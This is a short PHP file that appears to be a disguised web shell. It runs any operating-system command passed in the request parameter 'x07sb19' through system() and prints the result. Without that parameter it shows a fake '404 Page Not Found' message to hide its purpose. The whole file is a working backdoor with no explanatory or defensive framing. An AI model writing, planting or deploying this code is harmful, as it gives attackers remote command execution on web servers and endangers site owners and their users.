<?php 
    if(isset($_REQUEST['x07sb19'])){
        echo "<pre>";
          $cmd = ($_REQUEST['x07sb19']);
           system($cmd);
        echo "</pre>";
         die;
          }
    else{
        echo "404 Page Not Found";
    }
?>
